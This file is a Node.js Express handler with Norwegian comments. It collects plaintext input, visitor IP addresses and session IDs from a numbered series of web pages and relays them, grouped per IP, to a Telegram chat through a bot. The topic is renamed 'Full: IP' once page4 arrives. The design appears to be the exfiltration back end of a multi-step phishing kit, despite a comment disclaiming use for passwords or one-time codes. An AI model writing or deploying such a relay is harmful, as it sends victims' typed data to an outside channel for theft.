// api/log_data.js — Express handler (CommonJS)

const crypto = require('crypto');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// -----------------------------------------------------------------------------
// In-memory cache
// -----------------------------------------------------------------------------

const ipToTopicMap = new Map();

// Holder midlertidig data for sider som skal kombineres.
const pendingGroups = new Map();

// Når side 4 er behandlet, vet vi at topicet skal hete "Full: IP".
const fullTopicIPs = new Set();

// -----------------------------------------------------------------------------
// Page configuration
// -----------------------------------------------------------------------------

const GROUP_1_PAGES = new Set([
  'page1.5.html',
  'page1.7.html',
  'page2.html',
  'page3.html',
]);

const GROUP_2_PAGES = new Set([
  'page3.5.html',
  'page4.html',
]);

const SEPARATE_PAGES = new Set([
  'page5.html',
  'page6.html',
  'page7.html',
]);

// -----------------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------------

function escapeHtml(value) {
  if (value === undefined || value === null) {
    return '';
  }

  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function getIpAddress(req) {
  const forwardedFor = req.headers['x-forwarded-for'];

  if (forwardedFor) {
    return forwardedFor.split(',')[0].trim();
  }

  return (
    req.headers['x-real-ip'] ||
    req.socket?.remoteAddress ||
    'Ukjent IP'
  );
}

function getPageOrder(page) {
  const order = {
    'page1.5.html': 1,
    'page1.7.html': 2,
    'page2.html': 3,
    'page3.html': 4,
    'page3.5.html': 5,
    'page4.html': 6,
    'page5.html': 7,
    'page6.html': 8,
    'page7.html': 9,
  };

  return order[page] ?? 999;
}

function formatTime(timestamp) {
  return new Date(timestamp).toLocaleString('nb-NO', {
    timeZone: 'Europe/Oslo',
  });
}

// -----------------------------------------------------------------------------
// Telegram API
// -----------------------------------------------------------------------------

async function telegramRequest(method, payload) {
  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error('TELEGRAM_BOT_TOKEN mangler');
  }

  const url =
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });

  const result = await response.json().catch(() => null);

  if (!response.ok || !result?.ok) {
    const description =
      result?.description || response.statusText || 'Ukjent Telegram-feil';

    const error = new Error(
      `Telegram API error: ${description}`
    );

    error.telegram = true;
    error.status = response.status;
    error.error_code = result?.error_code;
    error.description = description;

    throw error;
  }

  return result;
}

// -----------------------------------------------------------------------------
// Create topic
// -----------------------------------------------------------------------------

async function createForumTopic(topicName) {
  const result = await telegramRequest('createForumTopic', {
    chat_id: TELEGRAM_CHAT_ID,
    name: topicName,
    icon_color: 0x6FB9F0,
  });

  return result.result.message_thread_id;
}

// -----------------------------------------------------------------------------
// Get/create topic
//
// IMPORTANT:
// We no longer use getForumTopics.
// That method is not available through the Telegram Bot API.
// -----------------------------------------------------------------------------

async function getOrCreateTopicForIP(ipAddress) {
  if (ipToTopicMap.has(ipAddress)) {
    return ipToTopicMap.get(ipAddress);
  }

  const topicName = fullTopicIPs.has(ipAddress)
    ? `Full: ${ipAddress}`
    : `IP: ${ipAddress}`;

  try {
    const topicId = await createForumTopic(topicName);

    ipToTopicMap.set(ipAddress, topicId);

    return topicId;
  } catch (error) {
    console.error(
      `Kunne ikke opprette topic "${topicName}":`,
      error.message
    );

    throw error;
  }
}

// -----------------------------------------------------------------------------
// Rename existing topic
// -----------------------------------------------------------------------------

async function renameForumTopic(topicId, newName) {
  await telegramRequest('editForumTopic', {
    chat_id: TELEGRAM_CHAT_ID,
    message_thread_id: topicId,
    name: newName,
  });

  console.log(
    `Topic ${topicId} endret til "${newName}"`
  );
}

// -----------------------------------------------------------------------------
// Send message
// -----------------------------------------------------------------------------

async function sendToTelegram(message, topicId) {
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'HTML',
  };

  if (topicId !== null && topicId !== undefined) {
    payload.message_thread_id = topicId;
  }

  return telegramRequest('sendMessage', payload);
}

// -----------------------------------------------------------------------------
// Format one activity
// -----------------------------------------------------------------------------

function formatActivity(data) {
  const {
    page,
    event_description,
    klartekst_input,
    session_uid,
    timestamp,
  } = data;

  let message = '';

  message += `📄 <b>Side:</b> ${escapeHtml(page || 'Ukjent')}\n`;

  message +=
    `📝 <b>Hendelse:</b> ` +
    `${escapeHtml(event_description || 'Ingen beskrivelse')}\n`;

  // Behold feltet som generelt input.
  // Ikke bruk dette til passord, OTP eller andre hemmeligheter.
  if (
    klartekst_input !== undefined &&
    klartekst_input !== null &&
    String(klartekst_input).trim() !== ''
  ) {
    message +=
      `✏️ <b>Input:</b> ` +
      `<code>${escapeHtml(klartekst_input)}</code>\n`;
  }

  if (session_uid) {
    message +=
      `🆔 <b>Session ID:</b> ` +
      `<code>${escapeHtml(session_uid)}</code>\n`;
  }

  message +=
    `⏰ <b>Tid:</b> ` +
    `${escapeHtml(formatTime(timestamp))}`;

  return message;
}

// -----------------------------------------------------------------------------
// Format grouped message
// -----------------------------------------------------------------------------

function formatGroupedMessage(ipAddress, entries, title) {
  const sorted = [...entries].sort((a, b) => {
    const order =
      getPageOrder(a.page) -
      getPageOrder(b.page);

    if (order !== 0) {
      return order;
    }

    return (
      new Date(a.timestamp).getTime() -
      new Date(b.timestamp).getTime()
    );
  });

  let message = '';

  message += `${title}\n`;
  message += `📍 <b>IP:</b> <code>${escapeHtml(ipAddress)}</code>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

  for (let i = 0; i < sorted.length; i++) {
    message += formatActivity(sorted[i]);

    if (i < sorted.length - 1) {
      message += '\n\n━━━━━━━━━━━━━━━━━━━━\n\n';
    }
  }

  return message;
}

// -----------------------------------------------------------------------------
// Group storage
// -----------------------------------------------------------------------------

function getPendingGroup(ipAddress, groupName) {
  if (!pendingGroups.has(ipAddress)) {
    pendingGroups.set(ipAddress, {
      group1: [],
      group2: [],
    });
  }

  return pendingGroups.get(ipAddress)[groupName];
}

function addToPendingGroup(ipAddress, groupName, entry) {
  const group = getPendingGroup(ipAddress, groupName);

  group.push(entry);
}

// -----------------------------------------------------------------------------
// Send Group 1
//
// page1.5 + page1.7 + page2 + page3
//
// The message is sent when page3 arrives.
// -----------------------------------------------------------------------------

async function handleGroup1(ipAddress, topicId, entry) {
  addToPendingGroup(ipAddress, 'group1', entry);

  if (entry.page !== 'page3.html') {
    return;
  }

  const groups = pendingGroups.get(ipAddress);

  if (!groups || groups.group1.length === 0) {
    return;
  }

  const message = formatGroupedMessage(
    ipAddress,
    groups.group1,
    '📦 <b>Aktivitet 1–3</b>'
  );

  await sendToTelegram(message, topicId);

  groups.group1 = [];

  console.log(
    `Gruppe 1 sendt for IP ${ipAddress}`
  );
}

// -----------------------------------------------------------------------------
// Send Group 2
//
// page3.5 + page4
//
// The message is sent when page4 arrives.
// -----------------------------------------------------------------------------

async function handleGroup2(ipAddress, topicId, entry) {
  addToPendingGroup(ipAddress, 'group2', entry);

  if (entry.page !== 'page4.html') {
    return;
  }

  const groups = pendingGroups.get(ipAddress);

  if (!groups || groups.group2.length === 0) {
    return;
  }

  const message = formatGroupedMessage(
    ipAddress,
    groups.group2,
    '📦 <b>Aktivitet 3.5–4</b>'
  );

  await sendToTelegram(message, topicId);

  groups.group2 = [];

  console.log(
    `Gruppe 2 sendt for IP ${ipAddress}`
  );

  // ---------------------------------------------------------------------------
  // AFTER page4:
  // Rename the SAME topic.
  // We do NOT create another topic.
  // ---------------------------------------------------------------------------

  if (!fullTopicIPs.has(ipAddress)) {
    await renameForumTopic(
      topicId,
      `Full: ${ipAddress}`
    );

    fullTopicIPs.add(ipAddress);
  }
}

// -----------------------------------------------------------------------------
// Send separate page
//
// page5 / page6 / page7
// -----------------------------------------------------------------------------

async function handleSeparatePage(
  ipAddress,
  topicId,
  entry
) {
  const message =
    `🔔 <b>Aktivitet</b>\n` +
    `📍 <b>IP:</b> <code>${escapeHtml(ipAddress)}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n\n` +
    formatActivity(entry);

  await sendToTelegram(message, topicId);

  console.log(
    `Separat melding sendt for ${entry.page} / ${ipAddress}`
  );
}

// -----------------------------------------------------------------------------
// Main handler
// -----------------------------------------------------------------------------

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({
      message: 'Kun POST er tillatt',
    });
  }

  try {
    if (!TELEGRAM_BOT_TOKEN) {
      return res.status(500).json({
        message: 'TELEGRAM_BOT_TOKEN mangler',
      });
    }

    if (!TELEGRAM_CHAT_ID) {
      return res.status(500).json({
        message: 'TELEGRAM_CHAT_ID mangler',
      });
    }

    const body = req.body || {};

    const {
      page,
      event_description,
      klartekst_input,
      session_uid: clientSessionUid,
    } = body;

    const ip_adresse = getIpAddress(req);

    const session_uid =
      clientSessionUid || crypto.randomUUID();

    const timestamp =
      new Date().toISOString();

    const entry = {
      page,
      event_description,
      klartekst_input,
      session_uid,
      timestamp,
    };

    console.log(
      `Log mottatt: ${ip_adresse} / ${page}`
    );

    // -------------------------------------------------------------------------
    // Get the ONE topic for this IP.
    // -------------------------------------------------------------------------

    const topicId =
      await getOrCreateTopicForIP(ip_adresse);

    // -------------------------------------------------------------------------
    // GROUP 1
    // -------------------------------------------------------------------------

    if (GROUP_1_PAGES.has(page)) {
      await handleGroup1(
        ip_adresse,
        topicId,
        entry
      );
    }

    // -------------------------------------------------------------------------
    // GROUP 2
    // -------------------------------------------------------------------------

    else if (GROUP_2_PAGES.has(page)) {
      await handleGroup2(
        ip_adresse,
        topicId,
        entry
      );
    }

    // -------------------------------------------------------------------------
    // SEPARATE PAGES
    // -------------------------------------------------------------------------

    else if (SEPARATE_PAGES.has(page)) {
      await handleSeparatePage(
        ip_adresse,
        topicId,
        entry
      );
    }

    // -------------------------------------------------------------------------
    // Unknown page
    // -------------------------------------------------------------------------

    else {
      const message =
        `🔔 <b>Aktivitet</b>\n` +
        `📍 <b>IP:</b> <code>${escapeHtml(ip_adresse)}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        formatActivity(entry);

      await sendToTelegram(
        message,
        topicId
      );
    }

    return res.status(200).json({
      message: 'Data behandlet',
      session_uid,
      ip_adresse,
      page,
    });

  } catch (error) {
    console.error(
      'Telegram error:',
      error
    );

    return res.status(500).json({
      message:
        error.message ||
        'Serverfeil',
    });
  }
}

module.exports = handler;
